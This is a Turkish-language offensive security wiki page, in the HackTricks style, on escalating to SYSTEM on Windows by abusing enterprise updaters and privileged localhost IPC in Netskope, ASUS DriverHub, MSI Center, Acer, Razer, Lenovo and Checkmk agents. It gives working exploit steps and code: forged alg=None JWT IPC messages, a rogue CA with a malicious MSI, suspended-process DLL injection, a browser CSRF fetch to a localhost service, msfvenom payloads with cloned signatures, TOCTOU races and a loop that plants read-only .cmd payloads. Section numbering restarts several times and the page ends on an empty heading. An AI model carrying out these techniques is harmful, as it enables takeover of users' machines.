# Kurumsal Otomatik Güncelleyicileri ve Ayrıcalıklı IPC'yi Kötüye Kullanma (örn. Netskope, ASUS ve MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük sürtünmeli bir IPC arayüzü ve ayrıcalıklı bir güncelleme akışı sunan kurumsal uç nokta ajanlarında ve güncelleyicilerde görülen bir Windows yerel ayrıcalık yükseltme zinciri sınıfını genelleştirir. Temsili bir örnek, Windows için Netskope Client < R129'dur (CVE-2025-0309). Bu örnekte düşük ayrıcalıklı bir kullanıcı, kaydı saldırganın kontrolündeki bir sunucuya yönlendirebilir ve ardından SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI teslim edebilir.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Benzer ürünlerde yeniden kullanabileceğiniz temel fikirler:
- Yeniden kaydı veya yeniden yapılandırmayı saldırganın sunucusuna yönlendirmek için ayrıcalıklı bir hizmetin localhost IPC'sini kötüye kullanın.
- Satıcının güncelleme uç noktalarını uygulayın, sahte bir Trusted Root CA teslim edin ve güncelleyiciyi kötü amaçlı, “imzalı” bir pakete yönlendirin.
- Zayıf imzalayan denetimlerini (CN izin listeleri), isteğe bağlı digest bayraklarını ve gevşek MSI özelliklerini atlatın.
- IPC “şifreliyse”, kayıt defterinde herkese açık olarak okunabilen makine tanımlayıcılarından anahtarı/IV'yi türetin.
- Hizmet, çağıranları görüntü yolu/işlem adıyla kısıtlıyorsa izin listesindeki bir işleme inject edin veya işlemi askıya alınmış olarak başlatıp minimal bir thread-context yamasıyla DLL'nizi yükleyin.

Özel yerel TCP hizmetleri, bir PIN veya başka bir uygulama kimlik bilgisi gerektirse bile aynı kimlik ve girdi sınırı incelemesine tabi tutulmalıdır. Listener'ı sürecine ve etkin hizmet hesabına eşleyin; ardından tam olarak dağıtılmış ikili dosyayı/sürümü ve çağıran tarafından kontrol edilen alanların sabit boyutlu arabelleklerine kopyalanmadan veya bir child-process komutu oluşturmak için kullanılmadan önce uzunluklarının denetlenip denetlenmediğini inceleyin. [Microsoft'un arabellek taşması kılavuzu](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns), ayrıcalıklı yerel kodda denetlenmeyen harici girdilerin neden tehlikeli olduğunu açıklar. Bir loopback listener, hardcoded credential veya tek başına işlem adı; bellek bozulmasını ya da SYSTEM olarak kod çalıştırılmasını kanıtlamaz. Erişilebilirlik, yetkilendirme, kod yolu ve mitigations ayrı ayrı değerlendirilmesi gereken koşullardır. Rutin enumeration işlemlerini pasif tutun; çalışan bir hizmete çökmeye yol açacak uzunlukta girdiler göndermeyin.

---
## 1) Localhost IPC üzerinden kaydı saldırganın sunucusuna yönlendirme

Birçok ajan, localhost TCP üzerinden JSON kullanarak SYSTEM hizmetiyle iletişim kuran bir kullanıcı modu UI süreciyle birlikte gelir.

Netskope'ta gözlemlenen:
- UI: stAgentUI (düşük bütünlük) ↔ Hizmet: stAgentSvc (SYSTEM)
- IPC komut kimliği 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend ana bilgisayarını (örn. AddonUrl) belirleyen claim'lere sahip bir JWT kayıt token'ı oluşturun. İmza gerekmemesi için alg=None kullanın.
2) JWT'niz ve tenant adınızla provisioning komutunu çağıran IPC mesajını gönderin:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis, kayıt/yapılandırma için sahte sunucunuza istek göndermeye başlar; ör.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Çağıran doğrulaması yol/ad tabanlıysa, isteği izin verilenler listesinde bulunan bir vendor binary'sinden başlatın (bkz. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Güncelleme kanalını ele geçirerek SYSTEM olarak kod çalıştırma

İstemci sunucunuzla iletişim kurduktan sonra, beklenen endpoint'leri uygulayın ve istemciyi saldırganın MSI dosyasına yönlendirin. Tipik sıra:

1) /v2/config/org/clientconfig → Çok kısa bir updater aralığı içeren JSON yapılandırması döndürün; ör.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA sertifikası döndürür. Hizmet bunu Local Machine Trusted Root deposuna yükler.
3) /v2/checkupdate → Kötü amaçlı bir MSI'ye ve sahte bir sürüme işaret eden metadata sağlayın.

Sahada sık görülen kontrolleri aşma:
- Signer CN allow-list: Hizmet yalnızca Subject CN değerinin “netSkope Inc” veya “Netskope, Inc.” olmasını kontrol ediyor olabilir. Rogue CA'niz bu CN değerine sahip bir leaf sertifikası oluşturup MSI'yi imzalayabilir.
- CERT_DIGEST özelliği: CERT_DIGEST adlı zararsız bir MSI özelliği ekleyin. Kurulum sırasında doğrulama yapılmaz.
- İsteğe bağlı digest doğrulaması: Yapılandırma bayrağı (ör. check_msi_digest=false) ek cryptographic validation işlemini devre dışı bırakır.

Sonuç: SYSTEM hizmeti MSI'nizi şu konumdan yükleyerek
C:\ProgramData\Netskope\stAgent\data\*.msi
NT AUTHORITY\SYSTEM olarak rastgele kod çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass dersi: Bir vendor, update kaynağını cryptographic authentication ile doğrulamak yerine küçük bir “trusted” domain kümesini allow-list'e alarak karşılık verirse, trafiği yönlendirmenize hâlâ izin veren vendor'a ait redirector veya reverse proxy'leri arayın. Netskope örneğinde, kamuya açık takip araştırmaları R129 dönemindeki bir allow-list'in, saldırganın kontrolündeki Azure App Service içeriğini proxy'leyen `rproxy.goskope.com` üzerinden hâlâ suistimal edilebildiğini gösterdi. Hostname allow-list'lerini bir güven sınırı değil, yalnızca bir tümsek olarak değerlendirin.<sup>[[14]](#references)</sup>

---
## 3) Şifrelenmiş IPC isteklerini taklit etme (varsa)

R127'den itibaren Netskope, IPC JSON verisini Base64'e benzeyen bir encryptData alanında sarmaladı. Tersine mühendislik, AES kullanıldığını ve key/IV değerlerinin tüm kullanıcılar tarafından okunabilen registry değerlerinden türetildiğini ortaya çıkardı:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Saldırganlar şifrelemeyi yeniden uygulayabilir ve standart bir kullanıcıdan geçerli şifrelenmiş komutlar gönderebilir.<sup>[[1]](#references)[[2]](#references)</sup> Genel ipucu: Bir agent aniden IPC'sini “şifrelemeye” başlarsa, HKLM altında device ID, product GUID ve install ID değerlerini materyal olarak arayın.

---
## 4) IPC caller allow-list'lerini aşma (path/name kontrolleri)

Bazı hizmetler, TCP bağlantısının PID değerini çözümleyip image path/name değerini Program Files altındaki allow-list'e alınmış vendor binary'leriyle (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırarak peer kimliğini doğrulamaya çalışır.

İki pratik bypass:
- Allow-list'e alınmış bir sürece (ör. nsdiag.exe) DLL injection yapıp IPC'yi içeriden proxy'leyin.
- Allow-list'e alınmış bir binary'yi askıya alınmış durumda başlatın ve sürücünün uyguladığı tamper kurallarını karşılamak için CreateRemoteThread kullanmadan proxy DLL'nizi yükleyin (§5'e bakın).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper korumasıyla uyumlu injection: askıya alınmış süreç + NtContinue patch'i

Ürünler, korunan süreçlerin handle'larından tehlikeli erişim haklarını çıkarmak için genellikle bir minifilter/OB callbacks sürücüsü (ör. Stadrv) içerir:
- Süreç: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE haklarıyla sınırlandırır

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) Bir vendor binary'si için CREATE_SUSPENDED ile CreateProcess çağırın.
2) Hâlâ kullanmanıza izin verilen handle'ları alın: süreç için PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve thread için THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya kodu bilinen bir RIP'te patch'liyorsanız yalnızca THREAD_RESUME).
3) ntdll!NtContinue (veya erken yüklenen, eşlenmesi garanti başka bir thunk) üzerine DLL path'inizle LoadLibraryW çağıran, ardından geri atlayan küçük bir stub yazın.
4) Stub'ı süreç içinde tetikleyip DLL'nizi yüklemek için ResumeThread çağırın.

Zaten korunan bir süreçte PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız (süreci siz oluşturduğunuz) için sürücünün politikası karşılanır.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Pratik araçlar
- NachoVPN (Netskope plugin), rogue CA oluşturmayı, kötü amaçlı MSI imzalamayı ve gerekli endpoint'leri sunmayı otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope, rastgele (isteğe bağlı olarak AES ile şifrelenmiş) IPC mesajları oluşturan ve allow-list'e alınmış bir binary'den istek göndermek için askıya alınmış süreç injection'ını içeren özel bir IPC client'tır.<sup>[[4]](#references)</sup>

## 7) Bilinmeyen updater/IPC yüzeyleri için hızlı triage iş akışı

Yeni bir endpoint agent veya anakart “helper” paketini incelerken, privesc hedefi olmaya elverişli olup olmadığını anlamak için genellikle hızlı bir iş akışı yeterlidir:<sup>[[6]](#references)</sup>

1) Loopback listener'larını numaralandırın ve vendor süreçleriyle eşleştirin:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Aday named pipe'ları listeleyin:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Plugin tabanlı IPC sunucularının kullandığı kayıt defteri destekli yönlendirme verilerini çıkarın:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Önce user-mode client'tan endpoint adlarını, JSON anahtarlarını ve command ID'lerini çıkarın. Paketlenmiş Electron/.NET frontend'leri sıklıkla tüm şemayı leak eder:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Süreci sonunda başlatan kod yolunu değil, güven kararını belirleyen gerçek koşulu arayın:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Öncelik vermeye değer kalıplar:
- `CryptQueryObject`/sertifika ayrıştırma işlemi genellikle `WinVerifyTrust` olmadan yapılıyorsa, “sertifika mevcut” ifadesi “sertifika güvenilir” olarak değerlendirilmiş olabilir. Bu, sertifika klonlama veya sahte imzalayıcı hileleri gibi yöntemleri mümkün kılar.
- `Origin`, `Referer`, indirme URL'leri, işlem adları veya imzalayan CN'leri üzerinde yapılan alt dize/son ek kontrolleri kimlik doğrulama değildir. `contains(".vendor.com")` kontrolü, saldırganın kontrolündeki benzer alan adlarıyla genellikle istismar edilebilir.
- Düşük ayrıcalıklı GUI “dosya güvenilir” kararını veriyor ve SYSTEM broker yalnızca bu sonucu kullanıyorsa, sınırı tamamen aşmak için istemci tarafındaki DLL/JS'yi yamalamak veya yeniden uygulamak çoğu zaman yeterlidir (Razer tarzı ayrık doğrulama).
- Broker bir payload'u `%TEMP%`/`C:\Windows\Temp` konumuna kopyalıyor ve ardından bu konumdan doğruluyor veya zamanlıyorsa, TOCTOU değiştirme pencerelerini ve daha zayıf denetimlere sahip alternatif `ExecuteTask()` sarmalayıcıları sunan kardeş eklenti modüllerini hemen test edin.<sup>[[6]](#references)</sup>

Adlandırılmış pipe kullanımının yoğun olduğu hedeflerde, protokolü ayrıntılı şekilde tersine mühendisliğe tabi tutmaya başlamadan önce zayıf DACL'leri ve uzaktan erişilebilen pipe'ları tespit etmek için PipeViewer hızlı bir yöntemdir.<sup>[[11]](#references)</sup>

Hedef, çağıranları yalnızca PID, imaj yolu veya işlem adına göre doğruluyorsa bunu bir sınır değil, aşılması gereken küçük bir engel olarak değerlendirin: meşru istemciye kod enjekte etmek veya izin verilen bir işlemden bağlantı kurmak çoğu zaman sunucunun denetimlerini geçmeye yeterlidir. Özellikle adlandırılmış pipe'lar için, [istemci kimliğine bürünme ve pipe suistimali hakkındaki bu sayfa](named-pipe-client-impersonation.md) temel yöntemi daha ayrıntılı ele alıyor.

Ayrıcalıklı bir **temizleme veya geri yükleme broker'ı** için pipe ACL'sinin yanı sıra yol güven sınırını da inceleyin. Hizmet yürütülebilir dosyası ve kurulum dizini korumalı olsa bile, düşük ayrıcalıklı bir çağıran paylaşılan bir dizinde geri yükleme hedefini seçebilir veya hazırlanmış bir yedekleme öğesini yeniden adlandırabilir. Çağıranın geri yükleme komutuna erişebildiğini, hazırlanmış tam girdiyi veya dosya adını değiştirebildiğini, broker'ın daha yüksek ayrıcalıklı bir kimlikle çalıştığını ve geri yükleme işleminin gerçekten seçilen korumalı yola yazdığını ayrı ayrı doğrulayın. Yazılabilir bir hazırlama dizini veya okunabilir bir pipe tek başına rastgele ayrıcalıklı yazma imkânı olduğunu kanıtlamaz; hedef eşlemesi ve hizmet davranışı kod incelemesiyle veya kontrollü testlerle doğrulanmalıdır. Bilinmeyen bir temizleme komutunu pasif keşif sırasında çalıştırmayın; kullanıcı dosyalarını silebilir.

---
## 8) Yalnızca satıcı imzalarını doğrulayan modüler eklenti broker'ları (Lenovo Vantage kalıbı)

Araştırmaya değer daha yeni bir varyasyon **imzalı istemci RPC broker'ı** modelidir: düşük ayrıcalıklı, Lenovo imzalı bir masaüstü işlemi SYSTEM hizmetiyle iletişim kurar ve hizmet, JSON komutlarını `%ProgramData%` altındaki XML ile tanımlanmış bir eklenti kümesine yönlendirir. Kabul edilen imzalı istemcilerden herhangi birinin **içinde kod yürütmeyi** başardıktan sonra, `runas="system"` sözleşmelerinin tümü saldırı yüzeyinizin parçası olur.<sup>[[15]](#references)</sup>

Lenovo Vantage araştırmalarında gözlemlenen yüksek değerli temel yöntemler:
- **Çağırana satıcı tarafından imzalı olduğu için güvenmek**: Araştırmacılar, Lenovo imzalı bir EXE'yi yazılabilir bir dizine kopyalayıp DLL side-load'u (`profapi.dll`) gerçekleştirerek, hizmetin zaten güvendiği bir istemcinin içinde rastgele kod çalıştırıp kimliği doğrulanmış bir bağlama ulaştı.
- **Manifest tabanlı saldırı yüzeyi keşfi**: Eklentiler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; bazı sözleşmeler SYSTEM olarak çalıştığından, bu manifestleri listelemek çoğu zaman gerçek ayrıcalıklı komutları broker'ın kendisini tersine mühendisliğe tabi tutmaktan daha hızlı ortaya çıkarır.
- **Kimliği doğrulanmış kanalın ardındaki komut bazlı hatalar**: Güvenilen istemcinin içinde çalışmaya başladıktan sonra, kamuya açık araştırmalarda güncelleme/kurulum komutlarında yol geçişi + yarış koşulları, ayrıcalıklı ayar veritabanlarında ham SQL suistimali ve amaçlanan hive dışına yazmayı mümkün kılan alt dize tabanlı kayıt defteri yolu denetimleri bulundu.

Bir hedefte işe yarar keşif:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Pratik çıkarım: Bir yardımcı araç paketi önce **çağıran süreci** doğrulayan ve ancak bundan sonra onlarca plugin/add-in komutuna yönlendirme yapan bir broker sunuyorsa, ön kapıdaki güven kontrolünü aşınca durmayın. Manifest/sözleşme tablosunu dökümleyin ve yüksek ayrıcalıklı her fiili bağımsız olarak fuzz testine tabi tutun; doğrulanmış kanal genellikle ikinci aşamada birkaç hata daha barındırır.

---
## 1) Ayrıcalıklı HTTP API’lerine karşı tarayıcıdan localhost’a CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde çalışan ve https://driverhub.asus.com adresinden gelen tarayıcı çağrılarını bekleyen, kullanıcı modunda bir HTTP hizmeti (ADU.exe) sunar. Origin filtresi, Origin başlığında ve `/asus/v1.0/*` üzerinden sunulan indirme URL’lerinde yalnızca `string_contains(".asus.com")` kontrolü yapar. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi saldırganın kontrolündeki herhangi bir ana makine bu denetimden geçer ve JavaScript üzerinden durum değiştiren istekler gönderebilir.<sup>[[6]](#references)</sup> Ek atlatma örüntüleri için [CSRF temelleri](../../pentesting-web/csrf-cross-site-request-forgery.md) sayfasına bakın.

Pratik akış:
1) `.asus.com` içeren bir alan adı kaydedin ve burada kötü amaçlı bir web sayfası barındırın.
2) `http://127.0.0.1:53000` üzerindeki ayrıcalıklı bir uç noktayı (ör. `Reboot`, `UpdateApp`) çağırmak için `fetch` veya XHR kullanın.
3) İşleyicinin beklediği JSON gövdesini gönderin – paketlenmiş frontend JS, aşağıdaki şemayı gösterir.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Aşağıda gösterilen PowerShell CLI bile Origin header'ı güvenilen değer olarak spoof edildiğinde başarılı olur:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Saldırganın sitesine yapılan herhangi bir tarayıcı ziyareti, böylece SYSTEM yetkileriyle çalışan bir yardımcıyı harekete geçiren 1 tıklamalı (veya `onload` aracılığıyla 0 tıklamalı) yerel bir CSRF'e dönüşür.

---
## 2) Güvensiz code-signing doğrulaması ve sertifika klonlama (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`, JSON gövdesinde tanımlanan rastgele çalıştırılabilir dosyaları indirir ve `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` konumunda önbelleğe alır. İndirme URL'si doğrulamasında aynı alt dize mantığı kullanıldığından, `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. İndirme sonrasında ADU.exe, dosyayı çalıştırmadan önce yalnızca PE dosyasının bir imza içerip içermediğini ve Subject dizgesinin ASUS ile eşleşip eşleşmediğini kontrol eder; `WinVerifyTrust` veya zincir doğrulaması yapmaz.

Bu akışı silahlandırmak için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS imzalayanını dosyaya klonlayın (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` görünümlü bir etki alanında barındırın ve yukarıdaki tarayıcı CSRF'si aracılığıyla UpdateApp'i tetikleyin.

Hem Origin hem de URL filtreleri alt dize tabanlı olduğundan ve imzalayan denetimi yalnızca dizeleri karşılaştırdığından, DriverHub saldırganın ikili dosyasını indirip yükseltilmiş bağlamında çalıştırır.<sup>[[6]](#references)</sup>

---
## 1) Updater kopyalama/çalıştırma yollarında TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center'ın SYSTEM hizmeti, her çerçevenin `4-byte ComponentID || 8-byte CommandID || ASCII arguments` biçiminde olduğu bir TCP protokolü sunar. Çekirdek bileşen (Component ID `0f 27 00 00`), `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` komutunu içerir. İşleyicisi:
1) Sağlanan çalıştırılabilir dosyayı `C:\Windows\Temp\MSI Center SDK.exe` konumuna kopyalar.
2) İmzayı `CS_CommonAPI.EX_CA::Verify` üzerinden doğrular (sertifika subject değeri “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalıdır).
3) Geçici dosyayı saldırganın denetimindeki argümanlarla SYSTEM olarak çalıştıran zamanlanmış bir görev oluşturur.

Kopyalanan dosya, doğrulama ile `ExecuteTask()` arasında kilitlenmez. Bir saldırgan şunları yapabilir:
- İmza denetiminin geçmesini ve görevin kuyruğa alınmasını garanti eden, MSI imzalı meşru bir ikili dosyayı işaret eden Frame A gönderir.
- Doğrulama tamamlandıktan hemen sonra `MSI Center SDK.exe` dosyasının üzerine yazan, kötü amaçlı bir payload'a işaret eden tekrarlanan Frame B mesajlarıyla yarışır.

Zamanlanmış görev tetiklendiğinde, özgün dosya doğrulanmış olmasına rağmen üzerine yazılan payload'ı SYSTEM olarak çalıştırır. Güvenilir exploit için, TOCTOU aralığını yakalayana kadar CMD_AutoUpdateSDK'ye mesaj yağdıran iki goroutine/thread kullanılır.<sup>[[6]](#references)</sup>

---
## 2) Özel SYSTEM düzeyindeki IPC ve impersonation'ı kötüye kullanma (MSI Center + Acer Control Centre)

### MSI Center TCP komut kümeleri
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında kayıtlı bir Component ID alır. Bir çerçevenin ilk 4 baytı bileşeni seçerek saldırganların komutları istedikleri modüllere yönlendirmesine olanak tanır.
- Plugin'ler kendi task runner'larını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` komutunu sunar ve **imza doğrulaması yapmadan** doğrudan `API_Support.EX_Task::ExecuteTask()` çağrısını yapar; herhangi bir yerel kullanıcı bu komutu `C:\Users\<user>\Desktop\payload.exe` dosyasına yönlendirerek güvenilir biçimde SYSTEM olarak kod çalıştırabilir.
- Wireshark ile loopback trafiğini yakalamak veya .NET ikili dosyalarını dnSpy'da incelemek Component ↔ command eşlemesini hızla ortaya çıkarır; ardından özel Go/ Python istemcileri çerçeveleri yeniden oynatabilir.<sup>[[6]](#references)</sup>

### Acer Control Centre adlandırılmış pipe'ları ve impersonation düzeyleri
- SYSTEM olarak çalışan `ACCSvc.exe`, `\\.\pipe\treadstone_service_LightMode` pipe'ını sunar ve bu pipe'ın isteğe bağlı ACL'si uzak istemcilere (ör. `\\TARGET\pipe\treadstone_service_LightMode`) izin verir. Bir dosya yolu ile birlikte command ID `7` gönderildiğinde, hizmetin süreç başlatma rutini çağrılır.
- İstemci kitaplığı, argümanlarla birlikte bir magic sonlandırıcı baytını (113) serileştirir. Frida/`TsDotNetLib` ile dinamik enstrümantasyon ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümündeki enstrümantasyon ipuçlarına bakın), yerel işleyicinin `CreateProcessAsUser` çağrısından önce bu değeri bir `SECURITY_IMPERSONATION_LEVEL` ve bütünlük SID'sine eşlediğini gösterir.
- 113 (`0x71`) yerine 114 (`0x72`) kullanmak, tam SYSTEM token'ını koruyan ve yüksek bütünlük SID'si (`S-1-16-12288`) ayarlayan genel dala düşürür. Böylece başlatılan ikili dosya hem yerel hem de makineler arası senaryolarda kısıtlanmamış SYSTEM olarak çalışır.
- Bunu, ACC'yi laboratuvar VM'lerinde bile kurup pipe'ı donanım olmadan kullanmayı sağlayan açık installer bayrağıyla (`Setup.exe -nocheck`) birleştirin.<sup>[[6]](#references)</sup>

Bu IPC hataları, localhost hizmetlerinin neden karşılıklı kimlik doğrulaması (ALPC SIDs, `ImpersonationLevel=Impersonation` filtreleri, token filtering) uygulaması gerektiğini ve her modülün “rastgele ikili dosya çalıştırma” yardımcısının aynı signer doğrulamalarını kullanmasının neden önemli olduğunu gösterir.

---
## 3) Zayıf user-mode doğrulamasına dayanan COM/IPC “elevator” yardımcıları (Razer Synapse 4)

Razer Synapse 4, bu aileye başka bir kullanışlı örüntü ekledi: düşük yetkili bir kullanıcı, `RzUtility.Elevator` aracılığıyla bir süreç başlatması için COM yardımcısından istekte bulunabilir; ancak güven kararı, ayrıcalıklı sınır içinde güçlü biçimde uygulanmak yerine user-mode DLL'sine (`simple_service.dll`) bırakılır.

Gözlemlenen exploit yolu:
- `RzUtility.Elevator` COM nesnesini oluşturun.
- Yükseltilmiş başlatma isteğinde bulunmak için `LaunchProcessNoWait(<path>, "", 1)` çağrısını yapın.
- Herkese açık PoC'de, isteği göndermeden önce `simple_service.dll` içindeki PE imza denetimi devre dışı bırakılır; böylece saldırganın seçtiği herhangi bir çalıştırılabilir dosya başlatılabilir.<sup>[[6]](#references)[[10]](#references)</sup>

Minimal PowerShell çağrısı:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Genel çıkarım: “helper” paketlerini analiz ederken yalnızca localhost TCP veya named pipe'larla yetinmeyin. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM sınıflarını kontrol edin ve ayrıcalıklı hizmetin hedef binary'yi gerçekten doğrulayıp doğrulamadığını ya da yalnızca yamalanabilir bir user-mode client DLL tarafından hesaplanan sonuca güvenip güvenmediğini teyit edin. Bu örüntü Razer'ın ötesinde de geçerlidir: yüksek ayrıcalıklı broker'ın düşük ayrıcalıklı taraftan gelen bir izin/verme kararını kullandığı her bölünmüş tasarım, olası bir privesc yüzeyidir.


---
## MSI onarımı sırasında tahmin edilebilir geçici script yürütme (Checkmk Agent / CVE-2024-0670)

Bazı Windows agent'ları hâlâ ayrıcalıklı işlemleri, `C:\Windows\Temp` konumuna geçici bir `.cmd` yazarak ve bunu `SYSTEM` olarak yürüterek gerçekleştiriyor. Dosya adı tahmin edilebiliyorsa ve hizmet mevcut dosyaları güvenli şekilde yeniden oluşturmuyorsa, düşük ayrıcalıklı bir kullanıcı gelecekte kullanılacak geçici dosyayı önceden **salt okunur** olarak oluşturabilir ve ayrıcalıklı işlemin kendi script'i yerine saldırgan denetimindeki içeriği yürütmesini sağlayabilir.

Güvenlik açığı bulunan Checkmk Agent derlemelerinde gözlemlenenler:
- geçici dosya kalıbı: `cmk_all_<PID>_1.cmd`
- etkilenen dallar: `2.0.0`, `2.1.0`, `2.2.0`
- tetikleyici: önbelleğe alınmış agent paketinin MSI **onarımı**<sup>[[8]](#references)[[9]](#references)</sup>

Uygulama adımları:
1. Mevcut işlem kimliklerinden veya çalışan agent PID'sinden gerçekçi bir PID aralığı tahmin edin.
2. Kısa bir **ASCII** `.cmd` payload'ı yazın (`Set-Content -Encoding Ascii` veya `cmd.exe` yönlendirmesini kullanın; batch dosyaları için UTF-16 PowerShell çıktısından kaçının).
3. Aday aralıktaki `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dosyalarını oluşturun ve her birini salt okunur olarak işaretleyin.
4. Ayrıcalıklı hizmetin geçici script'i yeniden oluşturmaya çalışıp ardından yürütmesini sağlamak için önbelleğe alınmış MSI'ın onarımını tetikleyin.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Güvenlik açığı bulunan ürün Windows Installer ile yüklenmişse, onarımı başlatmadan önce `C:\Windows\Installer` altındaki rastgele görünen önbelleğe alınmış MSI dosyasının hangi ürün adına karşılık geldiğini bulun:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta`, `msiexec /fa` etkileşimsiz bir WinRM shell'inden başarısız olduğunda ve mevcut bir masaüstü/bağlantısı kesilmiş oturumun onarımı doğru şekilde tetikleyip tetikleyemeyeceğini anlamanız gerektiğinde kullanışlıdır.<sup>[[7]](#references)</sup>
- Bu model, **world-writable konumlarda geçici script'ler hazırlayıp daha sonra bunları SYSTEM olarak çalıştıran** diğer endpoint agent'lara ve updater'lara da uygulanabilir. Öngörülebilir adları, exclusive create semantiğinin eksikliğini ve isteğe bağlı olarak tetiklenebilen repair/update akışlarını test edin.

### Etkileşimli installer repair ve ayrıcalıklı konsol

